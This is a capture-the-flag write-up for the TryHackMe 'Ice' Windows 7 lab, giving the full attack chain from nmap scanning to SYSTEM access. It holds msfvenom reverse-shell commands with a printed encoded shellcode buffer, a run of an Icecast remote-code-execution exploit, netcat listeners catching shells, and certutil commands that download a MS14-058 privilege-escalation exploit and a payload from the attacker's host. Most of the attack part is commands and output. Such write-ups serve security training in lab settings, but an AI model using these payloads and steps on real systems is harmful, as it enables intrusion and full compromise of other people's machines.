---
title: "THM - # Ice"
classes: wide
header:
  teaser: /assets/images/htb/htb.png
ribbon: blue
description: "Writeup for THM - # Ice"
categories:
  - THM
---

The given box ```Ice``` is a Windows machine 

- [TryHackMe- Ice](#tryhackme---Ice)
  - [Recon](#recon)
	  - [Nmap Scan](#nmap-scan)
 - [Enumeration](#enumeration)
	 - [Enumeration on port 80](#enumeration-on-port-80)

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/WINDOWS/Ice/assets/images/dav.png" />
</center>

![[Pasted image 20220729205634.png]]

## Recon

### Nmap Scan

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/WINDOWS/Ice/results/10.10.13.157/scans# nmap -p 8000,135,139,3389,445,49152,49153,49154,49158,49159,49160,5357 -sC -sV 10.10.115.167
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-29 21:07 IST
Nmap scan report for 10.10.115.167
Host is up (0.16s latency).

PORT      STATE  SERVICE      VERSION
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open   tcpwrapped
| ssl-cert: Subject: commonName=Dark-PC
| Not valid before: 2022-07-28T13:46:30
|_Not valid after:  2023-01-27T13:46:30
|_ssl-date: 2022-07-29T15:39:03+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: DARK-PC
|   NetBIOS_Domain_Name: DARK-PC
|   NetBIOS_Computer_Name: DARK-PC
|   DNS_Domain_Name: Dark-PC
|   DNS_Computer_Name: Dark-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2022-07-29T15:38:49+00:00
5357/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open   http-alt?
49152/tcp open   msrpc        Microsoft Windows RPC
49153/tcp open   msrpc        Microsoft Windows RPC
49154/tcp open   msrpc        Microsoft Windows RPC
49158/tcp open   msrpc        Microsoft Windows RPC
49159/tcp open   msrpc        Microsoft Windows RPC
49160/tcp closed unknown
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h00m00s, deviation: 2h14m10s, median: 0s
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:71:ec:10:cc:d9 (unknown)
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-07-29T10:38:48-05:00
| smb2-time:
|   date: 2022-07-29T15:38:49
|_  start_date: 2022-07-29T15:15:19

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.61 seconds
```

## Enumeration

### Enumeration on port 8000

https://www.cvedetails.com/vulnerability-list/vendor_id-693/opec-1/Icecast.html

![[Pasted image 20220729215132.png]]

## Post Exploitation

https://raw.githubusercontent.com/ivanitlearning/CVE-2004-1561/master/568-edit.c

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/WINDOWS/Ice/results/10.10.13.157/exploit# msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -b '\x0a\x0d\x00' -f c
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] =
"\xd9\xcb\xd9\x74\x24\xf4\xbe\xb4\x39\x28\x0e\x58\x29\xc9\xb1"
"\x52\x31\x70\x17\x03\x70\x17\x83\x74\x3d\xca\xfb\x88\xd6\x88"
"\x04\x70\x27\xed\x8d\x95\x16\x2d\xe9\xde\x09\x9d\x79\xb2\xa5"
"\x56\x2f\x26\x3d\x1a\xf8\x49\xf6\x91\xde\x64\x07\x89\x23\xe7"
"\x8b\xd0\x77\xc7\xb2\x1a\x8a\x06\xf2\x47\x67\x5a\xab\x0c\xda"
"\x4a\xd8\x59\xe7\xe1\x92\x4c\x6f\x16\x62\x6e\x5e\x89\xf8\x29"
"\x40\x28\x2c\x42\xc9\x32\x31\x6f\x83\xc9\x81\x1b\x12\x1b\xd8"
"\xe4\xb9\x62\xd4\x16\xc3\xa3\xd3\xc8\xb6\xdd\x27\x74\xc1\x1a"
"\x55\xa2\x44\xb8\xfd\x21\xfe\x64\xff\xe6\x99\xef\xf3\x43\xed"
"\xb7\x17\x55\x22\xcc\x2c\xde\xc5\x02\xa5\xa4\xe1\x86\xed\x7f"
"\x8b\x9f\x4b\xd1\xb4\xff\x33\x8e\x10\x74\xd9\xdb\x28\xd7\xb6"
"\x28\x01\xe7\x46\x27\x12\x94\x74\xe8\x88\x32\x35\x61\x17\xc5"
"\x3a\x58\xef\x59\xc5\x63\x10\x70\x02\x37\x40\xea\xa3\x38\x0b"
"\xea\x4c\xed\x9c\xba\xe2\x5e\x5d\x6a\x43\x0f\x35\x60\x4c\x70"
"\x25\x8b\x86\x19\xcc\x76\x41\x2c\x1a\x35\xda\x58\x1e\xc5\xdd"
"\x23\x97\x23\xb7\x43\xfe\xfc\x20\xfd\x5b\x76\xd0\x02\x76\xf3"
"\xd2\x89\x75\x04\x9c\x79\xf3\x16\x49\x8a\x4e\x44\xdc\x95\x64"
"\xe0\x82\x04\xe3\xf0\xcd\x34\xbc\xa7\x9a\x8b\xb5\x2d\x37\xb5"
"\x6f\x53\xca\x23\x57\xd7\x11\x90\x56\xd6\xd4\xac\x7c\xc8\x20"
"\x2c\x39\xbc\xfc\x7b\x97\x6a\xbb\xd5\x59\xc4\x15\x89\x33\x80"
"\xe0\xe1\x83\xd6\xec\x2f\x72\x36\x5c\x86\xc3\x49\x51\x4e\xc4"
"\x32\x8f\xee\x2b\xe9\x0b\x1e\x66\xb3\x3a\xb7\x2f\x26\x7f\xda"
"\xcf\x9d\xbc\xe3\x53\x17\x3d\x10\x4b\x52\x38\x5c\xcb\x8f\x30"
"\xcd\xbe\xaf\xe7\xee\xea";
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/WINDOWS/Ice/results/10.10.13.157/exploit# ./icecast 10.10.115.167

Icecast <= 2.0.1 Win32 remote code execution 0.1
by Luigi Auriemma
e-mail: aluigi@altervista.org
web:http://aluigi.altervista.org

shellcode add-on by Delikon
www.delikon.de

- target 10.10.115.167:8000
- send malformed data

Server IS vulnerable!!!
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/WINDOWS/Ice/results/10.10.13.157/exploit# rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.77.75] from (UNKNOWN) [10.10.115.167] 49214
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

 whoami
 whoami
dark-pc\dark
```

## Privilege Escalation

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/WINDOWS/Ice/results/10.10.13.157/exploit# python2 windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2022-07-29-mssb.xls
[*] done
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/WINDOWS/Ice/results/10.10.13.157/exploit# python2 windows-exploit-suggester.py -d 2022-07-29-mssb.xls --systeminfo ~/enum-more/obsidian_vault/thm/WINDOWS/Ice/results/10.10.13.157/loot/sysinfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 2 hotfix(es) against the 386 potential bulletins(s) with a database of 137 known exploits
[*] there are now 386 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 7 SP1 64-bit'
[*]
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*]
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*]
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*]
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*]
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*]
[E] MS16-059: Security Update for Windows Media Center (3150220) - Important
[*]   https://www.exploit-db.com/exploits/39805/ -- Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059), PoC
[*]
[E] MS16-056: Security Update for Windows Journal (3156761) - Critical
[*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)
[*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption
[*]
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*]
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*]
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*]
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
[*]
[E] MS15-134: Security Update for Windows Media Center to Address Remote Code Execution (3108669) - Important
[*]   https://www.exploit-db.com/exploits/38911/ -- Microsoft Windows Media Center Library Parsing RCE Vulnerability aka self-executing MCL File, PoC
[*]   https://www.exploit-db.com/exploits/38912/ -- Microsoft Windows Media Center Link File Incorrectly Resolved Reference, PoC
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object - 'els.dll' DLL Planting (MS15-134)
[*]   https://code.google.com/p/google-security-research/issues/detail?id=514 -- Microsoft Office / COM Object DLL Planting with els.dll
[*]
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
[*]
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
[*]
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
[*]
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*]
[M] MS15-100: Vulnerability in Windows Media Center Could Allow Remote Code Execution (3087918) - Important
[*]   https://www.exploit-db.com/exploits/38195/ -- MS15-100 Microsoft Windows Media Center MCL Vulnerability, MSF
[*]   https://www.exploit-db.com/exploits/38151/ -- Windows Media Center - Command Execution (MS15-100), PoC
[*]
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
[*]
[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
[*]
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*]
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*]
[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC
[*]
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*]
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*]
[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
[*]
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*]
[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
[*]
[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical
[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical
[*]   http://www.exploit-db.com/exploits/34458/
[*]
[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
[*]
[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*]
[*] done
```

```[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
```

https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS14-058/CVE-2014-4113-Exploit.rar

```shell
cd C:\Users\Dark\Desktop

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is ECF2-DF42

 Directory of C:\Users\Dark\Desktop

07/29/2022  10:03 AM    <DIR>          .
07/29/2022  10:03 AM    <DIR>          ..
11/11/2019  03:51 PM         1,900,871 icecast.exe
11/12/2019  06:04 PM             1,053 Icecast2 Win32.lnk
07/29/2022  10:03 AM         3,824,859 MS14-058.exe
07/29/2022  10:01 AM         3,492,558 MS14-068.exe
07/29/2022  09:21 AM         1,931,264 winPEASx64.exe
               5 File(s)     11,150,605 bytes
               2 Dir(s)  20,344,545,280 bytes free

rm  MS14-058.exe
rm  MS14-058.exe
'rm' is not recognized as an internal or external command,
operable program or batch file.

del MS14-058.exe
del MS14-058.exe

del MS14-068.exe
del MS14-068.exe

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is ECF2-DF42

 Directory of C:\Users\Dark\Desktop

07/29/2022  10:19 AM    <DIR>          .
07/29/2022  10:19 AM    <DIR>          ..
11/11/2019  03:51 PM         1,900,871 icecast.exe
11/12/2019  06:04 PM             1,053 Icecast2 Win32.lnk
07/29/2022  09:21 AM         1,931,264 winPEASx64.exe
               3 File(s)      3,833,188 bytes
               2 Dir(s)  20,350,484,480 bytes free

 certutil -urlcache -f http://10.11.77.75:8080/Win64.exe Win64.exe
 certutil -urlcache -f http://10.11.77.75:8080/Win64.exe Win64.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

Win64.exe whoami
Win64.exe whoami
nt authority\system
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/WINDOWS/Ice/results/10.10.13.157/exploit# msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9999 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
```

```shell
 certutil -urlcache -f http://10.11.77.75:8080/shell.exe shell.exe
 certutil -urlcache -f http://10.11.77.75:8080/shell.exe shell.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

Win64.exe shell.exe
Win64.exe shell.exe
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/WINDOWS/Ice/results/10.10.13.157# rlwrap nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.11.77.75] from (UNKNOWN) [10.10.115.167] 49186
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
nt authority\system

C:\Users\Dark\Desktop>

```

## Conclusion